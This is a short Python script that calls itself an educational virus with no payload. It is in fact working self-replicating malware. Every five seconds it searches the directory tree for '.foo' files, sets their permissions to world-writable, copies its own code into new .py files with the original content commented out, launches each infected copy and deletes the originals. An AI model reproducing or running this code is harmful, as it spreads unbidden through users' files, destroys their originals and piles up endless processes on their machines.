# Import necessary modules
import sys
import os
import glob
import time
import subprocess

# Print an educational message
print("This is an educational virus, with no payload")

# Record the start time
start_time = time.time()

# Define the main function
def main():
    # Calculate the elapsed time since the program started
    elapsed_time = int(time.time() - start_time)

    # Print the elapsed time
    print(f"Active for: {elapsed_time} seconds")

    # Open the current script file
    IN = open(sys.argv[0], 'r')

    # Read the first 100 lines of the script file
    virus = [line for (i, line) in enumerate(IN) if i < 100]

    # Close the script file
    IN.close()

    # Walk through the current directory and all its subdirectories
    for dirpath, dirs, files in os.walk(os.getcwd()):
        # For each file in the current directory
        for filename in files:
            # If the file has a .foo extension
            if filename.endswith('.foo'):
                # Get the full path of the file
                filepath = os.path.join(dirpath, filename)

                # Open the file
                IN = open(filepath, 'r')

                # Read all lines of the file
                all_of_it = IN.readlines()

                # Close the file
                IN.close()

                # If the file already contains the virus code, skip it
                if any('foovirus' in line for line in all_of_it):
                    continue

                # Change the file permissions to allow writing
                os.chmod(filepath, 0o777)

                # Open a new file with the same name but a .py extension
                OUT = open(filepath[:-4] + '.py', 'w')

                # Write the virus code to the new file
                OUT.writelines(virus)

                # Comment out the original code
                all_of_it = ['              #' + line for line in all_of_it]

                # Write the commented out original code to the new file
                OUT.writelines(all_of_it)

                # Close the new file
                OUT.close()
    
                # Open and run the new Python file
                subprocess.Popen(['python', filepath[:-4] + '.py'])

                # Delete the original .foo file
                os.remove(filepath)

# Run the main function every 5 seconds
while True:
    if __name__ == "__main__":
        main()
    # Pause for 5 seconds
    time.sleep(5)
